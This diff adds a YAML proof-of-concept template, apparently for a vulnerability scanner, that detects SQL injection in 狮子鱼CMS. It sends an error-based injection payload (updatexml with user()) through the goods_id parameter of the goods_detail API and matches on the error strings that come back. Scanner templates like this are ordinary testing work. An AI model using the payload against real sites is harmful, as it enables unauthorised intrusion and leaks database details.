@@ -1,0 +1,11 @@
+name: poc-yaml-狮子鱼CMS-sql
+description: "sql注入"
+method: GET
+path:
+  - /index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)
+expression:
+  status: 200
+  body_any:
+    - "localhost"
+    - "XPATH syntax error"
+    - "系统发生错误"
